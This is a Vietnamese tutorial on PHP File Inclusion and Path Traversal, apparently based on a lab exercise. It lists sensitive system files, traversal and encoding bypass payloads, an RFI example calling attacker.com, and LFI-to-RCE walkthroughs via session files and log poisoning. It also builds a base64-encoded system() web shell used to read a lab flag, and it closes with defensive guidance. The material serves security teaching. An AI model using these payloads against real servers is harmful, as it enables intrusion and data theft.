# File Inclusion And Path Traversal





## I.INTRODUCTION

### 1.Định nghĩa

* File Inclusion và Path Traversal là các lỗ hổng bảo mật xảy ra khi ứng dụng web cho phép người dùng thay đổi đường dẫn tệp tin thông qua đầu vào không được kiểm soát đúng cách.
* Hậu quả:
  * Truy cập file trái phép.
  * Thực thi mã độc.
  * Rò rỉ thông tin hệ thống.

### 2. Mục tiêu

* Hiểu được cách hoạt động và tác động của File Inclusion & Path Traversal.
* Nhận diện lỗ hổng trong ứng dụng web.
* Thực hành khai thác trong môi trường kiểm soát.
* Áp dụng kỹ thuật để giảm thiểu và phòng tránh.



### 3.Kiến thức nền tảng

* Kiến thức cơ bản về kiến trúc web và lập trình phía server.
* Làm quen với ngôn ngữ như PHP, Python, JavaScript.
* Biết sử dụng công cụ như OWASP ZAP hoặc Burp Suite.
* Biết khái niệm cơ bản về File Inclusion.



### Các Đường Dẫn Tập Tin Quan Trọng và Mô Tả

| **Vị trí (Đường dẫn)**        | **Mô tả**                                                                                 |
| ----------------------------- | ----------------------------------------------------------------------------------------- |
| `/etc/issue`                  | Chứa thông điệp hoặc thông tin nhận dạng hệ thống hiển thị trước khi đăng nhập.           |
| `/etc/profile`                | Quản lý các biến mặc định toàn hệ thống (ví dụ: biến môi trường, `umask`, thông báo thư). |
| `/proc/version`               | Thể hiện phiên bản của nhân (kernel) Linux đang sử dụng.                                  |
| `/etc/passwd`                 | Danh sách tất cả người dùng đã đăng ký có quyền truy cập hệ thống.                        |
| `/etc/shadow`                 | Chứa thông tin mật khẩu được mã hóa của người dùng.                                       |
| `/root/.bash_history`         | Lưu lịch sử các lệnh đã thực hiện của người dùng root.                                    |
| `/var/log/dmessage`           | Chứa các thông điệp hệ thống toàn cục, bao gồm thông báo khi khởi động hệ thống.          |
| `/var/mail/root`              | Chứa tất cả email gửi đến người dùng root.                                                |
| `/root/.ssh/id_rsa`           | Khóa riêng SSH của người dùng root (hoặc người dùng có quyền truy cập hệ thống).          |
| `/var/log/apache2/access.log` | Ghi lại các yêu cầu truy cập vào máy chủ web Apache.                                      |
| `C:\boot.ini`                 | Chứa thông tin cấu hình khởi động cho các hệ thống Windows dùng BIOS.                     |

<figure><img src="../.gitbook/assets/image (286).png" alt=""><figcaption></figcaption></figure>

## II.WEB APPLICATION ARCHITECTURE

### 1.Cấu trúc , ứng dụng của trang web

* Frontend: Giao diện người dùng (React, Vue, Angular), giao tiếp với backend qua API.
* Backend: Xử lý yêu cầu, truy vấn CSDL, trả dữ liệu. Viết bằng PHP, Python, Node.js…
* Mô hình client-server: Trình duyệt gửi HTTP request → Server xử lý → Trả kết quả về.

<figure><img src="../.gitbook/assets/image (473).png" alt=""><figcaption></figcaption></figure>

#### 2. Server-side Scripting và File Handling

### 2.Server-side Scripting và File Handling

* Script phía server có thể đọc, ghi và include file trên hệ thống.
* Nếu file path dựa trên input người dùng mà không lọc kỹ, sẽ gây ra lỗ hổng nghiêm trọng.



## III.FILE INCLUSION TYPES

### 1.Relative Path and Absolute Path



* Relative Path: `include('./folder/file.php')` — dựa vào thư mục hiện tại.
* Absolute Path: `/var/www/html/folder/file.php` — chỉ rõ từ thư mục gốc.



### 2.RFI

* Ứng dụng bao gồm file từ URL người dùng cung cấp.
* Kẻ tấn công chèn URL chứa mã độc để thực thi trên server.
* Ví dụ:\
  `include.php?page=http://attacker.com/malicious.php`

### 3.LFI

* Truy cập file nội bộ thông qua input như:\
  `include.php?page=../../../../etc/passwd`
* LFI có thể dẫn đến:
  * Truy cập thông tin nhạy cảm (CSDL, config).
  * Thực thi mã từ xa (RCE) nếu attacker chèn mã vào file log hoặc file tải lên.
*   Kỹ thuật khai thác nâng cao:

    * Log Poisoning: Ghi mã độc vào `/var/log/...` rồi include lại file log đó.

    <figure><img src="../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

### 4. So sánh

| Loại | Mục tiêu chính               | Kỹ thuật khai thác                            |
| ---- | ---------------------------- | --------------------------------------------- |
| RFI  | Nhúng và thực thi file từ xa | Gửi URL chứa mã độc qua tham số đầu vào       |
| LFI  | Truy cập file nội bộ         | Dùng `../` để vượt thư mục, đọc file hệ thống |
|      | (Có thể dẫn đến RCE)         | Kết hợp log poisoning, file upload…           |



**-phải có path traversal thì mới có LFI.**

**-LFI ko thể tự mình RCE được.**

**-chỉ khi đi cùng các lỗ hổng khác thì LFI mới có thể RCE.(**&#x53;upply chain attsckAttac&#x6B;_&#x73; ,_ Log poisoning File uploa&#x64;**)**



| Kỹ thuật                            | Mô tả                                                    |
| ----------------------------------- | -------------------------------------------------------- |
| Directory Traversal (`../`)         | Truy cập file ngoài thư mục hiện tại                     |
| Null Byte (`%00`)                   | Cắt đuôi `.php` auto-append (trên PHP <5.3.4)            |
| Ký hiệu `.` và `..`                 | Tránh filter `/etc/passwd/..`, `/etc/passwd/.`           |
| Chuỗi xen kẽ (`....//`)             | Bypass filter xóa `../`                                  |
| Thêm thư mục bị buộc (`languages/`) | Giữ nguyên thư mục bị yêu cầu rồi thoát ra với traversal |



## IV.PHP WRAPPER

### 1.Định nghĩa



* PHP wrappers là tính năng của PHP cho phép truy cập và xử lý các dòng dữ liệu thông qua các giao thức nội bộ.
* Nếu ứng dụng không xử lý đúng đầu vào từ người dùng, attacker có thể lợi dụng PHP wrappers để truy cập, mã hóa, hoặc thực thi mã trái phép.



### 2.ex : LFI kết hợp Wrapper `php://fillter`



* **Mục tiêu:** Đọc nội dung file hệ thống, ví dụ `/etc/passwd`, mà không bị chặn.
*   **Payload:**

    ```swift
    php://filter/convert.base64-encode/resource=/etc/passwd
    ```
* **Kết quả:** Trả về nội dung file đã được mã hóa base64 → attacker decode để lấy nội dung thật.
* **Lợi ích:** Có thể vượt qua cơ chế kiểm tra hoặc hiển thị dữ liệu dưới dạng an toàn hơn.



<figure><img src="../.gitbook/assets/image (475).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (477).png" alt=""><figcaption></figcaption></figure>

ex :&#x20;

```swift
?page=data:text/plain,<?php%20phpinfo();%20?>
```

<figure><img src="../.gitbook/assets/image (478).png" alt=""><figcaption></figcaption></figure>

#### 3. Một số bộ lọc phổ biến

| Payload                                                 | Mục đích / Output ví dụ         |
| ------------------------------------------------------- | ------------------------------- |
| `php://filter/convert.base64-encode/resource=.htaccess` | Mã hóa nội dung thành base64    |
| `php://filter/string.rot13/resource=.htaccess`          | Mã hóa theo thuật toán ROT13    |
| `php://filter/string.toupper/resource=.htaccess`        | Chuyển toàn bộ thành chữ in hoa |
| `php://filter/string.tolower/resource=.htaccess`        | Chuyển toàn bộ thành chữ thường |
| `php://filter/string.strip_tags/resource=.htaccess`     | Loại bỏ thẻ HTML nếu có         |
| (Không áp dụng filter)                                  | Trả về nội dung gốc             |

#### 4. Wrapper `data://`

* **Chức năng:** Nhúng dữ liệu trực tiếp vào dòng URL, cho phép thực thi đoạn mã nhỏ.
*   **Payload ví dụ:**

    ```php
    data:text/plain,<?php phpinfo(); ?>
    ```
* **Ý nghĩa:**
  * `data:` là loại wrapper.
  * `text/plain` là mime-type.
  * `<?php phpinfo(); ?>` là đoạn mã PHP sẽ được thực thi nếu không bị chặn.

#### 5. Rủi ro bảo mật

*   Các wrapper như `php://`, `data://`, `zip://`, `phar://` có thể bị lợi dụng để:

    * Đọc dữ liệu nhạy cảm.
    * Thực thi mã từ xa (RCE).
    * Vượt qua kiểm tra định dạng/tệp tin.



## V. Base Directory Breakouts

### 1. Mục tiêu

Hiểu cách kẻ tấn công có thể **vượt qua cơ chế lọc đường dẫn** (base path filters) trong các ứng dụng PHP dễ bị tổn thương bởi **LFI (Local File Inclusion)** thông qua các kỹ thuật như:

* Obfuscation (ẩn danh truy vết)
* Encoding
* Bypass kiểm tra chuỗi

### 2. Mã mẫu dễ bị tấn công

```php
function containsStr($str, $subStr){
    return strpos($str, $subStr) !== false;
}

if(isset($_GET['page'])){
    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
        include $_GET['page'];
    } else { 
        echo 'You are not allowed to go outside /var/www/html/ directory!';
    }
}
```

### 3. Cách tấn công vượt kiểm tra

Payload ví dụ:

```bash
/var/www/html/..//..//..//etc/passwd
```

Giải thích:

* `..//..//` không bị filter vì không khớp chính xác `../..`
* Nhưng hệ điều hành vẫn hiểu là `../../`

✅ **Bypass thành công**

<figure><img src="../.gitbook/assets/image (479).png" alt=""><figcaption></figcaption></figure>

### 4. Giải thích kỹ thuật

#### 4.1 Obfuscation (Ẩn truy vết)

Dùng các biến thể để qua mặt kiểm tra:

* `....//` tương đương `../`
* `..%00/` dùng null byte (có thể cần cấu hình nhất định)

#### 4.2 URL Encoding

| Loại            | Mô tả                 | Payload           |
| --------------- | --------------------- | ----------------- |
| Chuẩn           | Mã hóa `../` bằng hex | `%2e%2e%2f`       |
| Double Encoding | Khi bị decode 2 lần   | `%252e%252e%252f` |

#### 4.3 Bypass lọc lỗi logic

Ví dụ code:

```php
$file = str_replace('../', '', $_GET['file']);
include('files/' . $file);
```

Bypass bằng:

* `....//config.php`
* `%2e%2e%2fconfig.php`

### 5. Ví dụ payload thực tế

| Tình huống                      | Payload                            |
| ------------------------------- | ---------------------------------- |
| Bắt buộc base path, cấm `../..` | `/var/www/html/..//..//etc/passwd` |
| Bypass lọc `../` đơn giản       | `....//config.php`                 |
| Bypass bằng URL encoding        | `%2e%2e%2fconfig.php`              |
| Double encoding                 | `%252e%252e%252fconfig.php`        |

### 6. Cách phòng chống

* **Không bao giờ tin tưởng đầu vào từ người dùng** trong `include()`, `require()`.
* **Sử dụng whitelist** các file được phép truy cập.
*   **Kiểm tra đường dẫn thực tế bằng `realpath()`**:

    ```php
    $base_dir = realpath('/var/www/html/');
    $file = realpath($_GET['page']);
    if (strpos($file, $base_dir) === 0) {
        include($file);
    } else {
        die("Access denied.");
    }
    ```
* **Tắt cấu hình nguy hiểm trong php.ini**:
  * `allow_url_include = Off`
  * `allow_url_fopen = Off`
* **Thiết lập `open_basedir`** giới hạn thư mục mà PHP có thể truy cập.



## VI. LFI2RCE - Session Files

### 1. Mục tiêu

Hiểu cách khai thác LFI để đạt được **Remote Code Execution (RCE)** thông qua **PHP Session Files**, bằng cách:

* Ghi mã độc vào session file
* Sử dụng LFI để include và thực thi session file chứa mã độc

### 2. Cơ chế hoạt động

Trong PHP, dữ liệu session được lưu dưới dạng file trong thư mục tạm (mặc định là `/var/lib/php/sessions/`). Khi người dùng tương tác với ứng dụng, các biến session sẽ được ghi vào các file này.

Nếu một ứng dụng có lỗ hổng **LFI** và cho phép **include file dựa trên đầu vào**, thì attacker có thể thực thi mã PHP mà họ đã ghi vào session.

### 3. Mã mẫu dễ bị tấn công

```php
if(isset($_GET['page'])){
    $_SESSION['page'] = $_GET['page'];
    echo "You're currently in " . $_GET["page"];
    include($_GET['page']);
}
```

### 4. Quy trình khai thác

#### Bước 1: Gửi payload vào session

Gửi mã độc qua tham số `page`, ví dụ:

```php
?page=<?php echo phpinfo(); ?>
```

<figure><img src="../.gitbook/assets/image (480).png" alt=""><figcaption></figcaption></figure>

Lúc này, đoạn mã PHP sẽ được lưu vào file session tương ứng.

#### Bước 2: Tìm session ID

Session ID (thường được lưu trong cookie `PHPSESSID`) có thể được lấy từ DevTools trình duyệt:



```php
PHPSESSID=sess_abc123xyz456...
```

<figure><img src="../.gitbook/assets/image (481).png" alt=""><figcaption></figcaption></figure>

#### Bước 3: Gọi lại session file qua LFI

Dùng payload:

```swift
?page=/var/lib/php/sessions/sess_abc123xyz456
```

<figure><img src="../.gitbook/assets/image (482).png" alt=""><figcaption></figcaption></figure>

&#x20;PHP sẽ include session file → mã PHP trong đó được thực thi.

### 5. Điều kiện khai thác thành công

* Ứng dụng phải có LFI.
* Attacker có thể ghi dữ liệu tùy ý vào biến session.
* PHP không cấu hình session save handler sang dạng khác (như Redis).
* Máy chủ không bật cấu hình bảo vệ như `open_basedir` hoặc `disable_functions`.

### 6. Cách phòng chống

* **Không include trực tiếp bất kỳ đầu vào người dùng nào.**
* **Không dùng session data để build đường dẫn file.**
* **Sử dụng `basename()` và `realpath()` để xác thực đường dẫn.**
* **Giới hạn quyền truy cập thư mục `session.save_path`.**
* **Xoá hoặc expire session thường xuyên.**
* **Tắt `allow_url_include` và `allow_url_fopen`.**
* **Không echo hoặc log các file chứa code động.**



## VII. LFI2RCE - Log Poisoning

### 1. Mục tiêu

Hiểu cách khai thác **Log Poisoning** để đạt được **Remote Code Execution (RCE)** thông qua lỗ hổng **Local File Inclusion (LFI)**. Kỹ thuật này khai thác việc máy chủ ghi lại các log (nhật ký) chứa mã PHP do attacker tiêm vào.

### 2. Cơ chế hoạt động

Log poisoning là kỹ thuật attacker tiêm mã PHP vào các file log của server (như access.log hoặc error.log). Sau đó, attacker dùng LFI để include file log đó → mã PHP được thực thi.

Kênh ghi log thường gặp:

* **User-Agent header**
* **Referer header**
* **Custom HTTP request (Netcat, curl, Burp...)**

### 3. Mã mẫu khai thác

#### Bước 1: Tiêm mã PHP vào log file

Dùng Netcat để gửi yêu cầu chứa mã PHP:

```bash
$ nc 10.10.250.78 80      
<?php echo phpinfo(); ?>

HTTP/1.1 400 Bad Request
Date: Thu, 23 Nov 2023 05:39:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 335
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.10.250.78.eu-west-1.compute.internal Port 80</address>
</body></html>
```

<figure><img src="../.gitbook/assets/image (483).png" alt=""><figcaption></figcaption></figure>

Server sẽ phản hồi lỗi 400, nhưng đoạn mã PHP được ghi vào file log:

```
/var/log/apache2/access.log
```

#### Bước 2: Include file log qua LFI

Dùng URL sau để gọi lại log file:

```ruby
?page=/var/log/apache2/access.log
```

<figure><img src="../.gitbook/assets/image (484).png" alt=""><figcaption></figcaption></figure>

→ PHP code trong log file được thực thi.

### 4. Yêu cầu để khai thác thành công

* Web server ghi log từ các yêu cầu HTTP (access.log hoặc error.log).
* Có thể kiểm soát được nội dung ghi vào log.
* Có thể truy cập được file log qua LFI.
* PHP cho phép thực thi code trong file `.log`.

### 5. Phòng chống

* **Không include bất kỳ file nào dựa trên input người dùng.**
* **Thiết lập quyền truy cập chặt chẽ cho thư mục chứa log file.**
* **Lọc và xác thực đầu vào (User-Agent, Referer, URI, v.v).**
* **Tách biệt quyền truy cập giữa web app và file log.**
* **Không để thông tin nhạy cảm hoặc mã động ghi vào log.**
* **Sử dụng WAF hoặc IDS để phát hiện truy vấn bất thường.**



## VI. LFI2RCE - Wrappers

### 1. PHP Wrappers

PHP wrappers có thể được khai thác không chỉ để đọc file mà còn để thực thi mã PHP. Một trong những kỹ thuật phổ biến là sử dụng `php://filter` kết hợp với `base64` để thực thi mã độc gián tiếp thông qua việc giải mã và include.



### 2.Cơ chế hoạt động

Wrapper `php://filter` cho phép thực hiện các biến đổi dữ liệu (như base64 encode/decode) ngay khi đọc. Kẻ tấn công có thể chèn mã PHP được **mã hoá base64**, và yêu cầu server decode + thực thi đoạn mã đó.

#### Ví dụ minh họa

Truy cập:

```
http://10.10.250.78/playground.php
```

Giả sử bạn muốn thực thi đoạn mã PHP sau:

```php
<?php system($_GET['cmd']); echo 'Shell done!'; ?>
```

Mã này được mã hóa thành base64 là:

```
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
```

Khi kết hợp cùng `php://filter`, ta có payload hoàn chỉnh như sau:

```
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
```

#### Phân tích cấu trúc payload

| Trường              | Giá trị                                                                |
| ------------------- | ---------------------------------------------------------------------- |
| 1. Protocol Wrapper | `php://filter`                                                         |
| 2. Filter           | `convert.base64-decode`                                                |
| 3. Resource Prefix  | `resource=`                                                            |
| 4. Data Type        | `data://plain/text,`                                                   |
| 5. Encoded Payload  | `PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+` |

<figure><img src="../.gitbook/assets/image (485).png" alt=""><figcaption></figcaption></figure>

```
http://10.10.250.78/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=cat+-lia+flags/rt.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls+-lia
```

<figure><img src="../.gitbook/assets/image (486).png" alt=""><figcaption></figcaption></figure>



```
http://10.10.250.78/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls+-lia+flags
```

<figure><img src="../.gitbook/assets/image (487).png" alt=""><figcaption></figcaption></figure>

```
http://10.10.250.78/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=cat+-lia+flags/rt.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=cat+flags/cd3c67e5079de2700af6cea0a405f9cc.txt
```

<figure><img src="../.gitbook/assets/image (488).png" alt=""><figcaption></figcaption></figure>



#### Lưu ý quan trọng

* Không được gửi thêm `&cmd=whoami` cùng lúc khi nhập payload vào form web.
* Nếu bạn thêm `&cmd=...`, toàn bộ URL sẽ bị encode thành base64 và gây lỗi "invalid byte sequence".
* Sau khi submit payload, hãy thêm `&cmd=whoami` trực tiếp trên thanh địa chỉ trình duyệt để thực thi lệnh từ xa.

## VII. Conclusion

### 1. Tổng quan

File Inclusion và Path Traversal là hai lỗ hổng bảo mật phát sinh từ việc xử lý không đúng đầu vào người dùng trong các ứng dụng web. Trong File Inclusion, kẻ tấn công lợi dụng cách ứng dụng xử lý file để thực hiện **LFI (Local File Inclusion)** hoặc **RFI (Remote File Inclusion)**. Còn Path Traversal cho phép điều hướng cấu trúc thư mục server để truy cập các file nằm ngoài thư mục được chỉ định.

Cả hai đều có thể dẫn đến **truy cập trái phép dữ liệu** hoặc **chiếm quyền điều khiển hệ thống**.

### 2. Chiến lược phòng chống

1. **Xác thực và làm sạch dữ liệu đầu vào**\
   Kiểm tra và lọc kỹ lưỡng tất cả đầu vào của người dùng để ngăn chặn việc chèn chuỗi đường dẫn độc hại hoặc các mã độc.
2. **Sử dụng danh sách cho phép (allowlist)**\
   Chỉ định rõ danh sách các file được phép include hoặc truy cập. Từ chối bất kỳ yêu cầu nào nằm ngoài danh sách này.
3. **Cấu hình server hợp lý**
   * Tắt `allow_url_fopen` và `allow_url_include` nếu không sử dụng đến.
   * Hạn chế quyền truy cập vào hệ thống file của script PHP.
4. **Kiểm tra mã nguồn định kỳ**
   * Thường xuyên review mã nguồn và sử dụng công cụ tự động để phát hiện lỗ hổng.
   * Kết hợp cả kiểm tra thủ công để đảm bảo độ chính xác cao hơn.
5. **Đào tạo và nâng cao nhận thức bảo mật**\
   Cập nhật kiến thức cho toàn bộ team phát triển về coding an toàn, tránh lặp lại sai lầm.

### 2.1 Một số chiến lược khác

#### &#x20;**1. Cập nhật hệ thống và framework**

* Luôn giữ **hệ điều hành**, **web server** (Apache/Nginx), **PHP**, và **framework** ở **phiên bản mới nhất**.
* Các bản vá bảo mật thường sửa lỗi liên quan đến hàm `include()`, `require()` hoặc các wrapper nguy hiểm.

***

#### &#x20;**2. Tắt hiển thị lỗi PHP**

* **Nguy cơ**: Lỗi PHP có thể tiết lộ **đường dẫn tuyệt đối** hoặc cấu trúc thư mục.
*   **Giải pháp**:

    ```ini
    display_errors = Off
    log_errors = On
    error_log = /var/log/php_errors.log
    ```
* Chỉ log lỗi vào file riêng, không hiển thị cho người dùng.

***

#### &#x20;**3. Sử dụng Web Application Firewall (WAF)**

* WAF có thể:
  * Phát hiện & chặn chuỗi chứa `../` hoặc `http://`.
  * Phát hiện pattern payload tấn công RFI/LFI.
* Ví dụ: ModSecurity với OWASP CRS rules.

***

#### &#x20;**4. Vô hiệu hóa tính năng PHP không cần thiết**

*   Nếu ứng dụng **không cần** load file từ URL:

    ```ini
    allow_url_fopen = Off
    allow_url_include = Off
    ```
* Điều này ngăn `include('http://evil.com/file')`.

***

#### **5. Kiểm soát protocol và PHP wrappers**

* Chỉ cho phép những **protocol/wrapper** cần thiết (ví dụ: `file://`).
* Chặn các wrapper nguy hiểm:
  * `php://`
  * `data://`
  * `expect://`

***

#### &#x20;**6. Luôn kiểm tra & lọc đầu vào (Input Validation)**

* **Không tin tưởng dữ liệu từ client**.
*   Áp dụng:

    * **Whitelisting** (danh sách file được phép).
    * Kiểm tra regex để chỉ cho phép ký tự hợp lệ (chữ, số, gạch dưới).

    ```php
    $allowed_pages = ['home', 'about', 'contact'];
    if (in_array($page, $allowed_pages)) {
        include "pages/$page.php";
    } else {
        include "pages/404.php";
    }
    ```

***

#### &#x20;**7. Kết hợp Whitelist và Blacklist**

* **Whitelist**: Giới hạn file được include.
* **Blacklist**: Chặn chuỗi nguy hiểm (`../`, `%00`, `http://`).
* Whitelist hiệu quả hơn, nhưng kết hợp cả hai tăng mức bảo vệ.

***

#### &#x20;**Kinh nghiệm thực tế**

* LFI/RFI thường xảy ra khi `include()` hoặc `require()` nhận tham số trực tiếp từ GET/POST mà không qua kiểm soát.
* Khi không thể tránh hoàn toàn việc include file từ input người dùng, hãy:
  * Map ID → tên file, thay vì nhận tên file trực tiếp.
  *   Ví dụ:

      <pre class="language-php"><code class="lang-php"><strong>$map = ['1' => 'home.php', '2' => 'about.php'];
      </strong>$page = $_GET['page'];
      if (isset($map[$page])) {
          include "pages/" . $map[$page];
      }
      </code></pre>

### 3. Kết luận

File Inclusion và Path Traversal là những rủi ro lớn trong bảo mật web, nhưng hoàn toàn có thể phòng tránh được nếu tuân thủ các nguyên tắc lập trình an toàn. Việc chủ động bảo vệ ứng dụng, thường xuyên cập nhật kiến thức và áp dụng các biện pháp bảo mật phù hợp sẽ là chìa khóa giúp giảm thiểu tối đa các mối đe dọa từ các lỗ hổng này.

<figure><img src="../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>
